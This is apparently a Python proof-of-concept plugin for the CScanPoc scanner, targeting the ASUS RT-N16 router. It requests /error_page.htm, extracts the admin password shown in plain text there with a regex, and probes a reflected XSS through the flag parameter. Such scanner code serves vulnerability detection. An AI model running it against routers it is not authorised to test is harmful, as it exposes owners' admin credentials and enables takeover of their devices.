# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'ASUS-Router_0001'  # 平台漏洞编号，留空
    name = '华硕 RT-N16 路由器信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        华硕 RT-N16 - Text-plain Admin Password Disclosure and reflected xss,
        路由器存在管理员密码泄露漏洞，访问http://192.168.1.1/error_page.htm，管理员密码包含在如下的字符串中：
        if('1' == '0' || 'password' == 'admin')。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ASUS-Router'  # 漏洞应用名称
    product_version = 'RT-N16'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '93da198c-25b6-4f3e-a4f1-ff5acf06c029'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # admin pass disclosure
            url = self.target + '/error_page.htm'
            code, head, res, errcode, _ = hh.http(url)
            if code == 200:
                m = re.search(
                    r"if\('1' == '0' \|\| '([\S]*)' == '([\S]*)'", res)
                if m:
                    #security_hole('Admin Password Disclosure {username}:{password}'.format(username=m.group(2),password=m.group(1)))
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            # Reflected xss
            url = self.target + \
                '/error_page.htm?flag=%27%2balert(%27XSS%27)%2b%27'
            code, head, res, errcode, _ = hh.http(url)
            if code == 200 and "casenum = ''+alert('XSS')+'';" in res:
                #security_warning(url + ' reflected xss')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            else:
                pass

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
